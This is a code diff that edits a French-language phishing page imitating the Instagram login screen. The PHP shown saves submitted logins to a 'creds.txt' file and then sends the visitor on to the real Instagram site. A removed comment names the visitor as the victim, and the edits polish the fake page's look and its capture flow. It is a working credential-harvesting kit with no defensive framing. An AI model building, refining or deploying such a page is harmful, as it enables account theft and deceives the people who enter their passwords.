@@ -18,8 +18,8 @@ if ($_POST) {
     $log .= "└─────────────────────────────────────────\n";
 
     file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
-    
-    // Redirection vers Instagram (permet à la victime de voir la vraie page)
+
+    // Redirection directe vers Instagram
     header('Location: https://www.instagram.com/');
     exit;
 }
@@ -30,8 +30,9 @@ if ($_POST) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Connexion</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
     <style>
-        /* Instagram CSS Clone - Responsive et centré */
+        /* Instagram CSS Clone - RESPONSIVE ET CENTRÉ */
         body {
             background-color: #fafafa;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -41,8 +42,9 @@ if ($_POST) {
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            box-sizing: border-box;
         }
-        
+
         .main-container {
             display: flex;
             flex-direction: row;
@@ -54,7 +56,7 @@ if ($_POST) {
             padding: 32px 20px;
             gap: 32px;
         }
-        
+
         .phone-image {
             width: 380px;
             height: 581px;
@@ -64,7 +66,7 @@ if ($_POST) {
             background-size: contain;
             flex-shrink: 0;
         }
-        
+
         .login-section {
             display: flex;
             flex-direction: column;
@@ -72,7 +74,7 @@ if ($_POST) {
             gap: 12px;
             min-width: 350px;
         }
-        
+
         .login-box {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -83,7 +85,7 @@ if ($_POST) {
             max-width: 350px;
             box-sizing: border-box;
         }
-        
+
         .logo {
             font-family: 'Grand Hotel', cursive;
             font-size: 54px;
@@ -92,7 +94,7 @@ if ($_POST) {
             color: #262626;
             line-height: 1;
         }
-        
+
         .input-field {
             width: 100%;
             padding: 12px 16px;
@@ -103,13 +105,13 @@ if ($_POST) {
             background-color: #fafafa;
             box-sizing: border-box;
         }
-        
+
         .input-field:focus {
             outline: none;
             background-color: #fff;
             border-color: #a8a8a8;
         }
-        
+
         .submit-btn {
             background-color: #0095f6;
             border: 1px solid #0095f6;
@@ -122,11 +124,7 @@ if ($_POST) {
             width: 100%;
             margin-top: 8px;
         }
-        
-        .submit-btn:disabled {
-            background-color: #b2dffc;
-        }
-        
+
         .divider {
             display: flex;
             align-items: center;
@@ -134,18 +132,18 @@ if ($_POST) {
             color: #8e8e8e;
             font-size: 13px;
         }
-        
+
         .divider::before,
         .divider::after {
             content: "";
             flex: 1;
             border-bottom: 1px solid #dbdbdb;
         }
-        
+
         .divider span {
             padding: 0 18px;
         }
-        
+
         .fb-login {
             color: #385185;
             font-size: 14px;
@@ -157,18 +155,18 @@ if ($_POST) {
             justify-content: center;
             gap: 8px;
         }
-        
+
         .fb-login img {
             width: 16px;
             height: 16px;
         }
-        
+
         .forgot-password {
             font-size: 12px;
             color: #00376b;
             margin-bottom: 20px;
         }
-        
+
         .signup-box {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -180,25 +178,26 @@ if ($_POST) {
             box-sizing: border-box;
             font-size: 14px;
         }
-        
+
         .signup-link {
             color: #0095f6;
             font-weight: 600;
             text-decoration: none;
         }
-        
+
         .app-download {
             display: flex;
             justify-content: center;
             margin-top: 20px;
             gap: 10px;
         }
-        
+
         .app-download img {
             height: 40px;
             cursor: pointer;
         }
-        
+
+        /* RESPONSIVE */
         @media (max-width: 876px) {
             .main-container {
                 flex-direction: column;
@@ -213,7 +212,6 @@ if ($_POST) {
             }
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="main-container">
@@ -221,14 +219,14 @@ if ($_POST) {
         <div class="login-section">
             <div class="login-box">
                 <div class="logo">Instagram</div>
-                <form method="POST" action="instagramlogin.php">
+                <form method="POST" action="">
                     <input type="text" name="email" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
                     <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
                     <button type="submit" class="submit-btn">Se connecter</button>
                 </form>
                 <div class="divider"><span>OU</span></div>
                 <div class="fb-login">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%231877f2' d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E" alt="Facebook">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzE4NzdmMiIgZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS44NTR2LTguMzg1SDcuMDc4di0zLjQ3aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNSAyLjY4Ni4yMzV2Mi45NTNIMU5hM2M0LjMzLjc5NCAxNS44MyAxMS45MjcgMTUuODMgMTEuOTI3eiIvPjwvc3ZnPg==" alt="Facebook">
                     Se connecter avec Facebook
                 </div>
                 <div class="forgot-password">Mot de passe oublié ?</div>
@@ -242,20 +240,5 @@ if ($_POST) {
             </div>
         </div>
     </div>
-
-    <script>
-        // Script pour rediriger après capture
-        document.querySelector('form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formData = new FormData(this);
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => {
-                window.location.href = 'https://www.instagram.com/';
-            });
-        });
-    </script>
 </body>
 </html>
